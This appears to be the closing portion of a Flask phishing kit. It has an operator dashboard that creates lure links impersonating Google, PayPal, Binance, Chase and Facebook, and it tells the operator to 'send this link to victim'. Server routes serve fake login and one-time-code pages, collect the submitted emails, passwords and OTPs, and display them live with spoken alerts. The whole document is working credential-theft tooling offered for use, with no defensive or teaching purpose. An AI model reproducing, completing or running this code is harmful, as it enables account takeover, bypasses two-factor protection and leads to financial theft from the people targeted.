<div class="platform-grid">
<div class="platform-btn" onclick="generateLink('google')">📧 Google</div>
<div class="platform-btn" onclick="generateLink('paypal')">🔵 PayPal</div>
<div class="platform-btn" onclick="generateLink('binance')">🟡 Binance</div>
<div class="platform-btn" onclick="generateLink('chase')">🏦 Chase</div>
<div class="platform-btn" onclick="generateLink('facebook')">📘 Facebook</div>
</div>
<div id="linkOutput"></div>
</div>
<div class="card">
<h3>📊 Stolen Credentials</h3>
<button onclick="fetchData()" style="background:#0f0;color:#000;border:none;padding:8px 16px;margin-bottom:15px;cursor:pointer">🔄 Refresh</button>
<div style="max-height:400px;overflow:auto"><table id="dataTable"><table><th>Time</th><th>Platform</th><th>Email</th><th>Password</th><th>OTP</th></tr></div>
</div>
</div>
<script>
let lastCount=0;
let voiceEnabled=true;
document.getElementById('liveUrl').innerText = window.location.host;

function speakCredentials(platform){
    if(!voiceEnabled) return;
    let msg = new SpeechSynthesisUtterance(`Alert! New credentials received. Stolen from ${platform}. Email and password captured. Admin request for OTP.`);
    msg.rate = 0.9;
    window.speechSynthesis.cancel();
    window.speechSynthesis.speak(msg);
}

function speakOTP(){
    if(!voiceEnabled) return;
    let msg = new SpeechSynthesisUtterance("OTP code received. Act fast.");
    msg.rate = 1;
    window.speechSynthesis.cancel();
    window.speechSynthesis.speak(msg);
}

async function generateLink(p){
    let r=await fetch(`/generate_link?platform=${p}`), d=await r.json();
    let full=window.location.origin+d.link;
    document.getElementById('linkOutput').innerHTML=`<div class="link-box"><strong>📤 Send this link to victim:</strong><input class="link-input" type="text" value="${full}" id="linkInput" readonly><button class="copy-btn" onclick="copyLink()">📋 Copy Link</button><div style="margin-top:10px;font-size:11px">⚠️ When victim enters credentials, you will hear a voice alert!</div></div>`;
}
function copyLink(){ let i=document.getElementById('linkInput'); i.select(); document.execCommand('copy'); alert('Link copied!'); }
async function fetchData(){
    let r=await fetch('/get_stolen'), d=await r.json();
    if(d.length > lastCount){
        for(let i=lastCount; i<d.length; i++){
            if(d[i].step === 'login') speakCredentials(d[i].platform);
            else if(d[i].step === 'otp') speakOTP();
        }
        lastCount = d.length;
    }
    let html='<tr><th>Time</th><th>Platform</th><th>Email</th><th>Password</th><th>OTP</th></tr>';
    for(let i=d.length-1; i>=0; i--){
        html+=`<tr>
            <td style="white-space:nowrap">${d[i].timestamp||''}</td>
            <td style="color:#0f0;font-weight:bold">${d[i].platform||''}</td>
            <td style="color:#fff">${d[i].email||d[i].username||'-'}</td>
            <td style="color:#fff">${d[i].password||'-'}</td>
            <td style="color:#ff4444;font-weight:bold">${d[i].otp||'-'}</td>
        </tr>`;
    }
    document.getElementById('dataTable').innerHTML=html;
}
setInterval(fetchData, 2000);
fetchData();
</script>
</body></html>
'''

LOGIN_PAGES = {
    'google': GOOGLE_LOGIN,
    'paypal': PAYPAL_LOGIN,
    'binance': BINANCE_LOGIN,
    'chase': CHASE_LOGIN,
    'facebook': FACEBOOK_LOGIN
}

OTP_PAGES = {
    'google': GOOGLE_OTP,
    'paypal': PAYPAL_OTP,
    'binance': BINANCE_OTP,
    'chase': CHASE_OTP,
    'facebook': FACEBOOK_OTP
}

@app.route('/')
def index():
    return DASHBOARD

@app.route('/generate_link')
def generate_link():
    platform = request.args.get('platform', 'google')
    link_id = secrets.token_urlsafe(16)
    return jsonify({'link': f'/login/{platform}/{link_id}'})

@app.route('/login/<platform>/<link_id>')
def login_page(platform, link_id):
    return LOGIN_PAGES.get(platform, '<h1>Invalid platform</h1>')

@app.route('/otp/<platform>')
def otp_page(platform):
    return OTP_PAGES.get(platform, '<h1>Invalid platform</h1>')

@app.route('/submit', methods=['POST'])
def submit():
    data = request.json
    stolen_data.append({
        'platform': data.get('platform'),
        'step': data.get('step'),
        'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
        'email': data.get('email'),
        'username': data.get('username'),
        'password': data.get('password'),
        'otp': data.get('otp')
    })
    print(f"[+] {data.get('platform')} | {data.get('email', data.get('username', 'N/A'))}")
    return jsonify({'status': 'success'})

@app.route('/get_stolen')
def get_stolen():
    return jsonify(stolen_data[::-1])
